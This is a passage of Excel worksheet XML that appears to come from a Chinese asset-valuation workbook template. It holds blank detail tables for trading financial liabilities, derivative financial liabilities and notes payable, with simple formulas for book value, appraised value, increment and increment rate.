        <f>K26-J26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(J26=0,"",L26/J26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="17.25" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="580" t="n"/>
      <c r="I27" s="619" t="n"/>
      <c r="J27" s="580" t="n"/>
      <c r="K27" s="580" t="n"/>
      <c r="L27" s="555">
        <f>K27-J27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(J27=0,"",L27/J27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="17.25" customFormat="1" customHeight="1" s="116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115" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="580">
        <f>ROUND(SUM(H6:H27),2)</f>
        <v/>
      </c>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="580">
        <f>ROUND(SUM(J6:J27),2)</f>
        <v/>
      </c>
      <c r="K28" s="580">
        <f>ROUND(SUM(K6:K27),2)</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>K28-J28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(J28=0,"",L28/J28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="B2:N2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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3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 codeName="Sheet81">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="31.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="18" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="16.8333333333333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交易性金融负债评估明细表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402" t="inlineStr">
        <is>
          <t>表5-2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业务内容</t>
        </is>
      </c>
      <c r="F5" s="307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87" t="n"/>
      <c r="E6" s="3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Format="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380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Format="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380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6.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380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6.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380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Format="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380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Format="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380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Format="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380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Format="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380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Format="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380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Format="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380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Format="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380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Format="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380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Format="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380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Format="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380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Format="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380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Format="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380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Format="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380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Format="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380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Format="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380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Format="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="587" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="555">
        <f>ROUND(SUM(F6:F28),2)</f>
        <v/>
      </c>
      <c r="G29" s="555">
        <f>ROUND(SUM(G6:G28),2)</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>G29-F29</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>IF(F29=0,"",H29/F29*100)</f>
        <v/>
      </c>
      <c r="J29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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7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 codeName="Sheet82">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A30"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="15.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="29.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="16.3333333333333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衍生金融负债评估明细表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402" t="inlineStr">
        <is>
          <t>表5-3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376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K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到期日</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="G5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K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87" t="n"/>
      <c r="E6" s="587" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="587" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="587" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="587" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="587" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="587" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="587" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="587" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="587" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="587" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="587" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="587" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="587" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="587" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="587" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="587" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="587" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="587" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="587" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="587" t="n"/>
      <c r="E28" s="587" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="587" t="n"/>
      <c r="E29" s="587" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="555" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555">
        <f>H29-G29</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>IF(G29=0,"",I29/G29*100)</f>
        <v/>
      </c>
      <c r="K29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="381" t="n"/>
      <c r="D30" s="587" t="n"/>
      <c r="E30" s="587" t="n"/>
      <c r="F30" s="380" t="n"/>
      <c r="G30" s="555" t="n"/>
      <c r="H30" s="555" t="n"/>
      <c r="I30" s="555">
        <f>H30-G30</f>
        <v/>
      </c>
      <c r="J30" s="555">
        <f>IF(G30=0,"",I30/G30*100)</f>
        <v/>
      </c>
      <c r="K30" s="383" t="n"/>
    </row>
    <row r="31" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A31" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B31" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C31" s="567" t="n"/>
      <c r="D31" s="115" t="n"/>
      <c r="E31" s="115" t="n"/>
      <c r="F31" s="380" t="n"/>
      <c r="G31" s="555">
        <f>ROUND(SUM(G6:G30),2)</f>
        <v/>
      </c>
      <c r="H31" s="555">
        <f>ROUND(SUM(H6:H30),2)</f>
        <v/>
      </c>
      <c r="I31" s="555">
        <f>H31-G31</f>
        <v/>
      </c>
      <c r="J31" s="555">
        <f>IF(G31=0,"",I31/G31*100)</f>
        <v/>
      </c>
      <c r="K31" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B31:C31"/>
    <mergeCell ref="B2:K2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K31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3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 codeName="Sheet83">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A29" sqref="A6:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="10" customWidth="1" style="410" min="2" max="2"/>
    <col width="29.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="16.3333333333333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应付票据评估明细表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402" t="inlineStr">
        <is>
          <t>表5-4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376" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K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到期日</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>票面利率%</t>
        </is>
      </c>
      <c r="G5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K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78" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
